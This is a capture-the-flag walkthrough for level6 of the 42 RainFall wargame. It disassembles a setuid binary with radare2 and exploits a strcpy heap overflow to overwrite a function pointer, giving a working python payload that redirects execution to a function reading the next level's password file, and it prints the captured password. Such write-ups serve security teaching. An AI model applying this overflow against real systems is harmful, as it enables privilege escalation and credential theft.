# Level6

We can find an executable who segfault without parameter and print "Nope\n" with.
```
level6@RainFall:~$ ls -l
total 8
-rwsr-s---+ 1 level7 users 5274 Mar  6  2016 level6
level6@RainFall:~$ ./level6
Segmentation fault (core dumped)
level6@RainFall:~$ ./level6 a
Nope
level6@RainFall:~$
```
After analyze it with radare2 (please refer to [level1](https://github.com/maxisimo/42-RainFall/blob/main/level1/walkthrough.md) if you want more details on the steps to follow)  
We can see that the `main()` function call a function named `m()` but there is also a non-called `n()` function.  
- main() :
```
[0x080483a0]> s main
[0x0804847c]> pdda
    ; assembly                                   | /* r2dec pseudo code output */
                                                 | /* level6 @ 0x804847c */     
                                                 | #include <stdint.h>
                                                 |
    ; (fcn) main ()                              | int32_t main (char ** envp) {
                                                 |     char * src;
                                                 |     void * var_18h;
                                                 |     char * dest;
    0x0804847c push ebp                          |
    0x0804847d mov ebp, esp                      |
    0x0804847f and esp, 0xfffffff0               |
    0x08048482 sub esp, 0x20                     |
    0x08048485 mov dword [esp], 0x40             |     
    0x0804848c call 0x8048350                    |     eax = malloc (0x40);
    0x08048491 mov dword [esp + 0x1c], eax       |     *((esp + 0x1c)) = eax;
    0x08048495 mov dword [esp], 4                |
    0x0804849c call 0x8048350                    |     eax = malloc (4);
    0x080484a1 mov dword [esp + 0x18], eax       |     *((esp + 0x18)) = eax;
    0x080484a5 mov edx, 0x8048468                |     edx = m;
    0x080484aa mov eax, dword [esp + 0x18]       |     eax = *((esp + 0x18));
    0x080484ae mov dword [eax], edx              |     *(eax) = edx;
    0x080484b0 mov eax, dword [ebp + 0xc]        |     eax = *((ebp + 0xc));
    0x080484b3 add eax, 4                        |     eax += 4;
    0x080484b6 mov eax, dword [eax]              |     eax = *(eax);
    0x080484b8 mov edx, eax                      |     edx = *(eax);
    0x080484ba mov eax, dword [esp + 0x1c]       |     eax = *((esp + 0x1c));
    0x080484be mov dword [esp + 4], edx          |     *((esp + 4)) = edx;
    0x080484c2 mov dword [esp], eax              |
    0x080484c5 call 0x8048340                    |     strcpy (eax);
    0x080484ca mov eax, dword [esp + 0x18]       |     eax = *((esp + 0x18));
    0x080484ce mov eax, dword [eax]              |     eax = *(eax);
    0x080484d0 call eax                          |     void (*eax)() ();
    0x080484d2 leave                             |
    0x080484d3 ret                               |     return eax;
                                                 | }
[0x0804847c]>
```
- m() :
```
[0x0804847c]> s sym.m
[0x08048468]> pdda
    ; assembly                                   | /* r2dec pseudo code output */
                                                 | /* level6 @ 0x8048468 */
                                                 | #include <stdint.h>
                                                 |  
    ; (fcn) sym.m ()                             | void m (void) {
    0x08048468 push ebp                          |
    0x08048469 mov ebp, esp                      |
    0x0804846b sub esp, 0x18                     |
    0x0804846e mov dword [esp], 0x80485d1        |     
    0x08048475 call 0x8048360                    |     puts ("Nope");
    0x0804847a leave                             |
    0x0804847b ret                               |
                                                 | }
[0x08048468]>
```
- n() :
```
[0x08048468]> s sym.n
[0x08048454]> pdda
    ; assembly                                   | /* r2dec pseudo code output */
                                                 | /* level6 @ 0x8048454 */
                                                 | #include <stdint.h>
                                                 |  
    ; (fcn) sym.n ()                             | void n (void) {
    0x08048454 push ebp                          |
    0x08048455 mov ebp, esp                      |
    0x08048457 sub esp, 0x18                     |
    0x0804845a mov dword [esp], 0x80485b0        |
    0x08048461 call 0x8048370                    |     system ("/bin/cat /home/user/level7/.pass");
    0x08048466 leave                             |     
    0x08048467 ret                               |
                                                 | }
[0x08048454]>
```
Lets talk about the `main()`.   
There is a call to malloc(64) and then strcpy argv[1] into this area on the heap.
After that we can see a call to a useless `m()` function also stored in a heap buffer (malloc(4)) who simply call `puts()`.  
But there is a call to `system()` in a usefull non-called `n()` function.  
We need to execute the `n()` function.  
The first argument (argv[1]) is not limited and, as we said before, there is a call to strcpy() wich is vulnerable to buffer overflow.  
We should create a payload long enough to be copied into the second malloc data area.  
First, get the offset. Thanks to the pattern generator we found an offset of 72.  
Our final attack buffer will look like :  
- pad of arbitrary data : 72 bytes
- `n()` address         : 4 bytes
```
level6@RainFall:~$ python -c 'print "A" * 72 + "\x54\x84\x04\x08"' > /tmp/exploit
level6@RainFall:~$ cat /tmp/exploit | ./level6
Segmentation fault (core dumped)
level6@RainFall:~$
```
Obviously.. The usual method can't work because the program segfault without parameter
```
level6@RainFall:~$ ./level6 $(python -c 'print "A" * 72 + "\x54\x84\x04\x08"')
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
level6@RainFall:~$ su level7
Password: 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level7/level7
level7@RainFall:~$
```
Level6 passed!
